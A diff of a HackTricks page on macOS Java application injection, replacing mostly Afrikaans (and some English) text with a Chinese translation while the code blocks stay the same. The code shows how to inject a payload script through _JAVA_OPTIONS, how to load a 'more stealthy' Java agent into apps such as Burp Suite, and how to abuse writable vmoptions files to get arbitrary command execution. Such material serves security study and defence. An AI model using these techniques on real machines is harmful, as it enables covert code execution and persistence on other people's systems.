@@ -1,23 +1,23 @@
-# macOS Java Applications Injection
+# macOS Java 应用程序注入
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Enumeration
+## 枚举
 
-Vind Java-toepassings wat op jou stelsel geïnstalleer is. Dit is opgemerk dat Java-toepassings in die **Info.plist** sekere java parameters sal bevat wat die string **`java.`** bevat, so jy kan daarna soek:
+查找安装在系统中的 Java 应用程序。注意到 **Info.plist** 中的 Java 应用程序将包含一些包含字符串 **`java.`** 的 Java 参数，因此您可以搜索该字符串：
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -27,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Die omgewing veranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre java parameters in die uitvoering van 'n java gecompileerde toepassing in te spuit:
+环境变量 **`_JAVA_OPTIONS`** 可用于在执行编译的 Java 应用程序时注入任意 Java 参数：
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Om dit as 'n nuwe proses uit te voer en nie as 'n kind van die huidige terminal nie, kan jy gebruik maak van:
+要将其作为新进程而不是当前终端的子进程执行，可以使用：
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -86,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-However, that will trigger an error on the executed app, another more stealth way is to create a java agent and use:
+然而，这将在执行的应用程序上触发错误，另一种更隐蔽的方法是创建一个 Java 代理并使用：
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -96,10 +96,10 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Die skep van die agent met 'n **ander Java weergawe** as die toepassing kan die uitvoering van beide die agent en die toepassing laat crash
+使用与应用程序**不同的 Java 版本**创建代理可能会导致代理和应用程序的执行崩溃
 {% endhint %}
 
-Waar die agent kan wees:
+代理可以是：
 
 {% code title="Agent.java" %}
 ```java
@@ -120,19 +120,19 @@ err.printStackTrace();
 ```
 {% endcode %}
 
-Om die agent te kompileer, voer uit:
+要编译代理，请运行：
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Met `manifest.txt`:
+使用 `manifest.txt`：
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-En dan voer die omgewing veranderlike uit en hardloop die java-toepassing soos:
+然后导出环境变量并运行 Java 应用程序，如下所示：
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -141,14 +141,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions-lêer
+## vmoptions 文件
 
-Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses in staat te stel om arbitrêre opdragte uit te voer**.\
-Boonop kan hierdie lêer ook **ander insluit** met die `include` gids, so jy kan ook 'n ingeslote lêer verander.
+此文件支持在执行 Java 时指定 **Java 参数**。您可以使用之前的一些技巧来更改 Java 参数并 **使进程执行任意命令**。\
+此外，此文件还可以使用 `include` 目录 **包含其他文件**，因此您也可以更改包含的文件。
 
-Nog meer, sommige Java-apps sal **meer as een `vmoptions`** lêer laai.
+更重要的是，一些 Java 应用程序将 **加载多个 `vmoptions`** 文件。
 
-Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek** vir hierdie lêers, soos:
+一些应用程序，如 Android Studio，会在其 **输出中指示它们正在查找** 这些文件的位置，例如：
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -159,7 +159,7 @@ Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek*
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-As hulle nie, kan jy dit maklik nagaan met:
+如果他们没有，你可以轻松地通过以下方式检查：
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -167,4 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, 'n plek waar enige gebruiker van die **`admin` groep skryfrek toegang het.**
+注意，在这个例子中，Android Studio 正在尝试加载文件 **`/Applications/Android Studio.app.vmoptions`**，这是任何来自 **`admin` 组的用户都有写入权限的地方。**
